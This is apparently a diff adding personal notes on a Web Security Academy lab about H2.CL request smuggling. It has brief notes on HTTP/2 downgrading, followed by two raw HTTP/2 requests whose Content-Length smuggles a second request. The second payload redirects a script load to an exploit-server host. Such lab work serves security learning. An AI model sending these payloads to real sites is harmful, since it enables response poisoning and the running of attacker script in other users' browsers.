@@ -1,0 +1,31 @@
+Lab: H2.CL request smuggling
+Notes:
+    -HTTP/2 sends the request in the form of frames, it do not require headers like CL or TE.
+    - Backend downgrades the HTTP/2 to HTTP/1.1 means it uses one of the encoding.
+    - obfuscating TE in Backend:   
+                
+
+Analysis:
+Front-end downgrades HTTP/2
+(1)
+POST / HTTP/2
+Host: 0af1009c0304754880709e4500b900d4.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+GET \asda HTTP/1.1
+---------------------> (H2.CL)
+(2)
+POST / HTTP/2
+Host: 0af1009c0304754880709e4500b900d4.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+GET /resources/labheader/js HTTP/1.1
+Host: exploit-0a100095034375f1800e9d150185003c.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
